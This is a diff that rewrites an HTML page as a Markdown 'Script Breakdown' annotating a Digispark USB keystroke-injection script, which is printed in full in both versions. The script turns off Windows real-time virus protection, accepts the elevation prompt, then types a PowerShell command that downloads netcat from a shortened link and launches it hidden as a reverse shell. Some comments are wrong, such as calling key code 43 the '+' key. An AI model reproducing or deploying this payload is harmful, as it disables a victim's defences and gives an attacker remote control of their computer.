@@ -1,67 +1,37 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Script Breakdown</title>
-  <style>
-    h1 {
-      text-align: center;
-      font-style: italic;
-    }
-    .code-line {
-      font-family: monospace;
-      margin-bottom: 10px;
-    }
-    .code-comment {
-      color: green;
-    }
-    .code-delay {
-      color: blue;
-    }
-    .code-key {
-      color: purple;
-    }
-    .code-modifier {
-      color: orange;
-    }
-  </style>
-</head>
-<body>
-  <h1>Script Breakdown</h1>
-  
-  <div class="code-line">#include "DigiKeyboard.h"</div>
-  <div class="code-line">void setup() {</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(1000);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(1000);</div>
-  <div class="code-line">  DigiKeyboard.print("virus &amp; threat protection");</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(500);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(5000);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(43);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(43);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(43);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(43);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(700);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(700);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_SPACE);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(2000);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(1000);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(500);</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</div>
-  <div class="code-line code-delay">  DigiKeyboard.delay(700);</div>
-  <div class="code-line">  DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe &lt;ip&gt; &lt;port&gt; -e powershell.exe");</div>
-  <div class="code-line code-key">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</div>
-  <div class="code-line">}</div>
-  
-  <script>
-    // Empty loop function
-    void loop() {}
-  </script>
-  
-  <h2>Warning</h2>
-  <em>Everything in this repository is intended for educational purposes only. I am not responsible for any wrong behavior on your part. You are responsible for your actions using the script.</em>
-</body>
-</html>
+# Script Breakdown
+
+The following breakdown explains each line of the script:
+
+```cpp
+#include "DigiKeyboard.h"   // Includes the DigiKeyboard library
+
+void setup() {
+  DigiKeyboard.delay(1000);   // Pauses the script for 1 second
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);   // Sends a key press for the S key with the left GUI (Windows) key modifier
+  DigiKeyboard.delay(1000);   // Pauses the script for 1 second
+  DigiKeyboard.print("virus & threat protection");   // Inputs the text "virus & threat protection"
+  DigiKeyboard.delay(500);   // Pauses the script for 0.5 seconds
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);   // Sends a key press for the Enter key
+  DigiKeyboard.delay(5000);   // Pauses the script for 5 seconds
+  DigiKeyboard.sendKeyStroke(43);   // Sends a key press for the + key (four times), which opens the settings menu in Windows 10
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.delay(700);   // Pauses the script for 0.7 seconds
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);   // Sends a key press for the Enter key
+  DigiKeyboard.delay(700);   // Pauses the script for 0.7 seconds
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);   // Sends a key press for the Space key
+  DigiKeyboard.delay(2000);   // Pauses the script for 2 seconds
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);   // Sends a key press for the Y key with the left Alt key modifier
+  DigiKeyboard.delay(1000);   // Pauses the script for 1 second
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);   // Sends a key press for the F4 key with the left Alt key modifier, which closes the current window
+  DigiKeyboard.delay(500);   // Pauses the script for 0.5 seconds
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   // Sends a key press for the R key with the left GUI (Windows) key modifier, which opens the Run dialog box
+  DigiKeyboard.delay(700);   // Pauses the script for 0.7 seconds
+  DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");   // Inputs a PowerShell command that downloads and executes the netcat.exe tool
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);   // Sends a key press for the Enter key, which executes the PowerShell command
+}
+
+void loop() {
+  // The loop function is empty in this script and not used
+}
